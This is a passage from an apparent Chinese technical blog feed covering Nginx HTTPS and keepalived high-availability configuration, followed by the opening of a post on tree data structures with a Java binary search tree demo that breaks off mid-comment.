<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 生成domain.key，密码输入123456</span><br><span class="line">openssl genrsa -des3 -out domain.key 2048</span><br><span class="line"></span><br><span class="line">// 去掉domain.key的密码</span><br><span class="line">openssl rsa -in domain.key -out domain.key		</span><br><span class="line"></span><br><span class="line">// 生成domain.crt，回车输入domain.key的密码后（上一步已经清除了密码，如果没去掉密码则要输入），一直回车，直到提示Common Name (eg, your name or your server&#x27;s hostname)，输入域名或者ip</span><br><span class="line">openssl req -new -x509 -key domain.key -out domain.crt -days 3650</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>添加http_ssl_module模块（先nginx -V查看是否已经添加，如果已添加，则不需要再添加了）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/nginx-1.20.1</span><br><span class="line"></span><br><span class="line"># 添加http_ssl_module模块，否则配置不了https</span><br><span class="line">./configure --with-http_ssl_module</span><br><span class="line"></span><br><span class="line"># 重新编译，但编译后，一定不能执行make install，否则会覆盖原nginx，编译后，会生成./objs/nginx可执行文件</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 备份旧的可执行文件</span><br><span class="line">mv /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak</span><br><span class="line"></span><br><span class="line"># 替换旧的可执行文件</span><br><span class="line">cp ./objs/nginx /usr/local/nginx/sbin/</span><br><span class="line"></span><br><span class="line"># 查看模块是否添加成功</span><br><span class="line">nginx -V</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>nginx配置https</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen   443 ssl;</span><br><span class="line">    server_name 192.168.199.140;</span><br><span class="line">    </span><br><span class="line">    ssl_certificate		ssl/domain.crt;		# domain.pem</span><br><span class="line">    ssl_certificate_key	ssl/domain.key;		# domain.key</span><br><span class="line">    ssl_session_cache  shared:SSL:1m;</span><br><span class="line">    ssl_session_timeout 5m;</span><br><span class="line">    ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://192.168.199.140:8091;</span><br><span class="line">        # root  html;</span><br><span class="line">        # index index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>测试配置是否正确并重新加载配置文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 测试配置是否正确</span><br><span class="line">nginx -t -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line"># 重新加载配置文件</span><br><span class="line">nginx -s reload -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line"># 访问</span><br><span class="line">curl https://192.168.199.140:80/test/index.html --insecure</span><br><span class="line"></span><br><span class="line">优化https：</span><br><span class="line">1.适当增大keepalive；</span><br><span class="line">2.设置ssl_session缓存</span><br></pre></td></tr></table></figure>

<h1 id="8-高可用"><a href="#8-高可用" class="headerlink" title="8. 高可用"></a>8. 高可用</h1><h2 id="8-1-环境安装搭建"><a href="#8-1-环境安装搭建" class="headerlink" title="8.1 环境安装搭建"></a>8.1 环境安装搭建</h2><ol>
<li>这里使用两台服务器进行搭建：192.168.199.161、192.168.199.161，分别这两台服务器上[安装nginx](#1. 安装)，并且分别安装keepalived，步骤如下：</li>
</ol>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装keepalived</span><br><span class="line">yum -y install keepalived</span><br><span class="line"></span><br><span class="line"># 查看是否安装成功</span><br><span class="line">[root@localhost ~]# rpm -qa|grep keepalived</span><br><span class="line">keepalived-1.3.5-19.el7.x86_64</span><br><span class="line"></span><br><span class="line"># 备份原配置文件</span><br><span class="line">cp /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.conf.bak</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>覆盖keepalived.conf配置文件内容</li>
</ol>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/etc/keepalived/keepalived.conf</span><br><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">   router_id LVS_DEVEL</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_nginx &#123;</span><br><span class="line">    script &quot;/etc/keepalived/nginx_check.sh&quot;    #脚本位置</span><br><span class="line">    interval 2    #检测脚本执行的间隔</span><br><span class="line">    weight -20</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state BACKUP    #备份服务器上将MASTER 改为BACKUP</span><br><span class="line">    interface ens33    #网卡</span><br><span class="line">    virtual_router_id 51    #主、备机的virtual_router_id必须相同</span><br><span class="line">    priority 100    #主、备机取不同的优先级，主机值较大，备份机值较小</span><br><span class="line">    advert_int 1</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    track_script &#123;</span><br><span class="line">        chk_nginx</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.199.50    #VRRP H虛拟地址</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>分别在2个服务器上把脚本nginx_check.sh上传到&#x2F;etc&#x2F;keepalived&#x2F;目录，nginx_check.sh内容如下</li>
</ol>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/etc/keepalived/nginx_check.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">#主要的任务是如果没有发现nginx这个进程，则重启，如果依然没发现，则把keepalived停用</span><br><span class="line">A=`ps -C nginx --no-header | wc -l`</span><br><span class="line">if [ $A -eq 0 ];then</span><br><span class="line">    /usr/local/nginx/sbin/nginx</span><br><span class="line">    sleep 2</span><br><span class="line">    if [ `ps -C nginx --no-header | wc -l` -eq 0 ];then</span><br><span class="line">        killall keepalived</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>给nginx_check.sh添加可执行权限：chmod a+x nginx_check.sh</li>
<li>分别在2台服务器中启动nginx和keepalived</li>
</ol>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动nginx和keepalived</span><br><span class="line">systemctl start keepalived &amp;&amp; nginx</span><br><span class="line"></span><br><span class="line"># 开放80端口</span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent &amp;&amp; firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"># 浏览器分别访问（直接访问）</span><br><span class="line">http://192.168.199.161</span><br><span class="line">http://192.168.199.161</span><br><span class="line"></span><br><span class="line"># 通过虚拟ip访问（高可用）</span><br><span class="line">http://192.168.199.50</span><br><span class="line"></span><br><span class="line"># 停止主节点的nginx和keepalived，再访问，看看是否高可用（存在停用主节点nginx，但不停用keepalived，导致集群无法使用的问题？？？）</span><br><span class="line">systemctl stop keepalived &amp;&amp; nginx -s stop</span><br></pre></td></tr></table></figure>

<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.多个server下的server_name相同，会访问最先读取的配置</span><br><span class="line"></span><br><span class="line">2.主要模块说明</span><br><span class="line">sub_status：展示相关参数</span><br><span class="line">random_index：指定目录下的随机首页，不会展示隐藏文件的首页</span><br><span class="line">sub（sub_filter和sub_filter_one）：替换字符串，是否仅仅替换第一个</span><br><span class="line">limit_conn：连接限制</span><br><span class="line">limit_req：请求限制</span><br><span class="line">access：基于ip的访问控制，如果中间再加一层的话，remote_addr发送了改变，可以使用x_forward_for头信息或者自定义头信息来携带ip信息</span><br><span class="line">auth_basic：基于用户的信任登录进行访问控制</span><br><span class="line"></span><br><span class="line">3.proxy_params通用参数配置</span><br><span class="line">proxy_redirect default;</span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_connect_timeout 30;</span><br><span class="line">proxy_send_timeout 60;</span><br><span class="line">proxy_read_timeout 60;</span><br><span class="line">proxy_buffer_size 32k;</span><br><span class="line">proxy_buffering on;</span><br><span class="line">proxy_buffers 4 128k;</span><br><span class="line">proxy_busy_buffers_size 256k;</span><br><span class="line">proxy_max_temp_file_size 256k;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构 - 树</title>
    <url>/2024/01/02/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20-%20%E6%A0%91/</url>
    <content><![CDATA[<h1 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h1><h2 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h2><p>树是n（n &gt;&#x3D; 0）个节点的有限集。n为0时，称为空树。<a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">点击在线演示</a>。</p>
<p>特点：</p>
<ol>
<li>有且仅有一个根节点；</li>
<li>当n &gt; 1时，其余节点可分为m（m &gt; 0）个互不相交的有限集，每个集合本身又是一棵树，称为根的子树；</li>
</ol>
<h2 id="1-2-术语"><a href="#1-2-术语" class="headerlink" title="1.2 术语"></a>1.2 术语</h2><p><img src="/../img/tree1.png"></p>
<ol>
<li>根节点：一棵树最顶部的节点（无父节点）。（节点A）</li>
<li>祖先节点：根节点到指定节点路径上的任意节点。（A、B、F均为K的祖先节点）</li>
<li>子孙节点：以指定节点为祖先节点的节点，都是指定节点的子孙节点。（K、F均为B的子孙节点）</li>
<li>双亲节点（父节点）：根节点到指定节点路径上，最靠近指定节点的节点。（F为K的双亲节点）</li>
<li>孩子节点：与双亲节点刚好相反。（K为F的孩子节点）</li>
<li>兄弟节点：具有相同双亲节点的节点。（E、F、G为兄弟节点；B、C、D为兄弟节点）</li>
<li>节点的度：节点的孩子个数，也等于节点分支数。（B的度为3、C的度为1）</li>
<li>树的度：最大的节点的度。（这里为3）</li>
<li>分支节点：有孩子节点的节点，度数 &gt; 0。（F、C）</li>
<li>叶子节点：无孩子节点的节点，度数 &#x3D; 0。(E、K、L)</li>
<li>节点的层次：以根节点作为第1层，根节点的子节点为第2层，以此类推。</li>
<li>堂兄弟节点：双亲在同一层的节点互为堂兄弟。（E、F、G、H、I、J）</li>
<li>树的高度或深度：树中最大的节点的层次。（这里为4）</li>
<li>节点高度：节点到其下叶子节点的最长路径，叶子节点高度为0。（D高度为2）</li>
<li>节点深度：节点到根节点的路径，等于节点的层次-1，根节点深度为0。（D深度为1）</li>
<li>森林：由m（m &gt;&#x3D; 0）棵互不相交的树的集合称为森林。</li>
</ol>
<h2 id="1-3-分类"><a href="#1-3-分类" class="headerlink" title="1.3 分类"></a>1.3 分类</h2><ol>
<li>无序树：树中任意节点的子节点之间没有顺序关系，这种树称为无序树,也称为自由树。</li>
<li>有序树：树中任意节点的子节点之间有顺序关系，这种树称为有序树。</li>
<li>二叉树：每个节点最多含有两个子树的树称为二叉树。</li>
<li>满二叉树：叶节点除外的所有节点均含有两个子树的树被称为满二叉树。</li>
<li>完全二叉树：除最后一层外，所有层都是满节点，且最后一层缺右边连续节点的二叉树称为完全二叉树。</li>
<li>哈夫曼树（霍夫曼树、最优二叉树）：带权路径最短的二叉树。</li>
</ol>
<h1 id="2-二叉查找树（BST）"><a href="#2-二叉查找树（BST）" class="headerlink" title="2. 二叉查找树（BST）"></a>2. 二叉查找树（BST）</h1><p>​		二叉查找树又名二叉搜索树、二叉排序树，若它的左子树不空，则左子树上所有节点的值均小于它的根节点的值； 若它的右子树不空，则右子树上所有节点的值均大于它的根节点的值； 它的左、右子树也分别为二叉查找树。时间复杂度最好情况是O(logN)，最坏情况是O(N)，大O表示法中的log是以2为底数N的对数。</p>
<p>遍历方法：有前序遍历（根 &#x3D;&gt; 左 &#x3D;&gt; 右）、中序遍历（左 &#x3D;&gt; 根 &#x3D;&gt; 右）、后序遍历（左 &#x3D;&gt; 右 &#x3D;&gt; 根）、层次遍历。中序遍历的前节点为后节点的前驱，后节点为前节点的后继。如下图删除前，前序遍历：10，8，5，9，12，16，13，17；中序遍历：5，8，9，10，12，13，16，17；后续遍历：5，9，8，13，17，16，12，10。</p>
<p><img src="/../img/tree2.png"></p>
<p>二叉查找树demo（测试前序遍历、中序遍历、后序遍历、插入、查询、删除，删除规则可查看代码的注释）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TreeNodeTest</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/1/22 20:42</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeNodeTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> TreeNodeHolder holder;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        holder = <span class="keyword">new</span> <span class="title class_">TreeNodeHolder</span>();</span><br><span class="line">        holder.add(<span class="number">10</span>);</span><br><span class="line">        holder.add(<span class="number">8</span>);</span><br><span class="line">        holder.add(<span class="number">5</span>);</span><br><span class="line">        holder.add(<span class="number">9</span>);</span><br><span class="line">        holder.add(<span class="number">12</span>);</span><br><span class="line">        holder.add(<span class="number">16</span>);</span><br><span class="line">        holder.add(<span class="number">13</span>);</span><br><span class="line">        holder.add(<span class="number">17</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;前序遍历&quot;</span>);</span><br><span class="line">        holder.preOrder(holder.root);</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;中序遍历&quot;</span>);</span><br><span class="line">        holder.midOrder(holder.root);</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;后序遍历&quot;</span>);</span><br><span class="line">        holder.postOrder(holder.root);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testTreeOperation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 重复添加</span></span><br><span class="line">        System.out.println(<span class="string">&quot;第二次添加17：&quot;</span> + holder.add(<span class="number">17</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检索数据</span></span><br><span class="line">        System.out.println(holder.get(<span class="number">17</span>));</span><br><span class="line">        <span class="comment">// 检索不到数据</span></span><br><span class="line">        System.out.println(holder.get(<span class="number">18</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-------------- 初始化后 --------------&quot;</span>);</span><br><span class="line">        holder.printLeavesRoutes();</span><br><span class="line"></span><br><span class="line">        holder.remove(<span class="number">13</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------- 删除13后 --------------&quot;</span>);</span><br><span class="line">        holder.printLeavesRoutes();</span><br><span class="line"></span><br><span class="line">        holder.remove(<span class="number">12</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------- 删除12后 --------------&quot;</span>);</span><br><span class="line">        holder.printLeavesRoutes();</span><br><span class="line"></span><br><span class="line">        holder.remove(<span class="number">16</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------- 删除16后 --------------&quot;</span>);</span><br><span class="line">        holder.printLeavesRoutes();</span><br><span class="line"></span><br><span class="line">        holder.remove(<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------- 删除10后 --------------&quot;</span>);</span><br><span class="line">        holder.printLeavesRoutes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">TreeNodeHolder</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除根节点后，记得重新绑定为根节点</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 前序遍历</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(TreeNode cNode)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (cNode == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(cNode.value + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            preOrder(cNode.left);</span><br><span class="line">            preOrder(cNode.right);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 中序遍历</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">midOrder</span><span class="params">(TreeNode cNode)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (cNode == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            midOrder(cNode.left);</span><br><span class="line">            System.out.print(cNode.value + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            midOrder(cNode.right);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 后序遍历</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode cNode)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (cNode == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            postOrder(cNode.left);</span><br><span class="line">            postOrder(cNode.right);</span><br><span class="line">            System.out.print(cNode.value + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(Integer value)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> root.add(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">(Integer value)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> root.get(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Integer <span class="title function_">remove</span><span class="params">(Integer value)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> root.remove(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printLeavesRoutes</span><span class="params">()</span> &#123;</span><br><span class="line">            List&lt;Integer&gt; leaves = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            getLeaves(root, leaves);</span><br><span class="line">            <span class="keyword">for</span> (Integer leaf : leaves) &#123;</span><br><span class="line">                System.out.println(get(leaf));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有叶子，遍历整颗树</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getLeaves</span><span class="params">(TreeNode cNode, List&lt;Integer&gt; leaves)</span> &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">cl</span> <span class="operator">=</span> cNode.left;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">cr</span> <span class="operator">=</span> cNode.right;</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; cr != <span class="literal">null</span>) &#123;</span><br><span class="line">                getLeaves(cl, leaves);</span><br><span class="line">                getLeaves(cr, leaves);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">                getLeaves(cl, leaves);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cr != <span class="literal">null</span>) &#123;</span><br><span class="line">                getLeaves(cr, leaves);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                leaves.add(cNode.value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line">            <span class="keyword">private</span> Integer value;</span><br><span class="line">            <span class="keyword">private</span> TreeNode parent;</span><br><span class="line">            <span class="keyword">private</span> TreeNode left;</span><br><span class="line">            <span class="keyword">private</span> TreeNode right;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">TreeNode</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">TreeNode</span><span class="params">(Integer value, TreeNode parent, TreeNode left, TreeNode right)</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.value = value;</span><br><span class="line">                <span class="built_in">this</span>.parent = parent;</span><br><span class="line">                <span class="built_in">this</span>.left = left;</span><br><span class="line">                <span class="built_in">this</span>.right = right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> Integer <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Integer value)</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.value = value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> TreeNode <span class="title function_">getParent</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> parent;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParent</span><span class="params">(TreeNode parent)</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.parent = parent;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> TreeNode <span class="title function_">getLeft</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLeft</span><span class="params">(TreeNode left)</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.left = left;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> TreeNode <span class="title function_">getRight</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRight</span><span class="params">(TreeNode right)</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.right = right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 增</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(Integer value)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> addNode(root, value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">addNode</span><span class="params">(TreeNode cNode, Integer value)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cNode.value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    cNode.value = value;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (value &lt; cNode.value) &#123;   <span class="comment">// 放左子树</span></span><br><span class="line">                    <span class="keyword">if</span> (cNode.left == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 左子树为null，直接放在左边</span></span><br><span class="line">                        cNode.setLeft(<span class="keyword">new</span> <span class="title class_">TreeNode</span>(value, cNode, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 左子树不为null，当前节点指向左子树，进行递归</span></span><br><span class="line">                        <span class="keyword">return</span> addNode(cNode.left, value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; cNode.value) &#123;    <span class="comment">// 放右子树</span></span><br><span class="line">                    <span class="keyword">if</span> (cNode.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 右子树为null，直接放在右边</span></span><br><span class="line">                        cNode.setRight(<span class="keyword">new</span> <span class="title class_">TreeNode</span>(value, cNode, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 右子树不为null，当前节点指向右子树，进行递归</span></span><br><span class="line">                        <span class="keyword">return</span> addNode(cNode.right, value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 已经存在相同值的数据，返回false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">(Integer value)</span> &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> getNode(root, value);</span><br><span class="line">                <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">TreeNode</span> <span class="variable">p</span> <span class="operator">=</span> node;</span><br><span class="line">                    List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        list.add(p.value);</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((p = p.parent) != <span class="literal">null</span>);</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) &#123;</span><br><span class="line">                        sb.append(list.get(i));</span><br><span class="line">                        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            sb.append(<span class="string">&quot; -&gt; &quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> sb.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 根据value找到节点</span></span><br><span class="line">            <span class="keyword">private</span> TreeNode <span class="title function_">getNode</span><span class="params">(TreeNode cNode, Integer value)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cNode == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (value &lt; cNode.value) &#123;</span><br><span class="line">                    <span class="keyword">return</span> getNode(cNode.left, value);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; cNode.value) &#123;</span><br><span class="line">                    <span class="keyword">return</span> getNode(cNode.right, value);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> cNode;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 删：方法一</span></span><br><span class="line"><span class="comment">//            public Integer remove(Integer value) &#123;</span></span><br><span class="line"><span class="comment">//                /**</span></span><br><span class="line"><span class="comment">//                 * 找到被删除节点后，判断节点类型，被删除节点用node代替：</span></span><br><span class="line"><span class="comment">//                 * 1.根节点：把左（右）子节点设为新的根节点，获取左（右）子树最右（左）边的节点，</span></span><br><span class="line"><span class="comment">//                 *   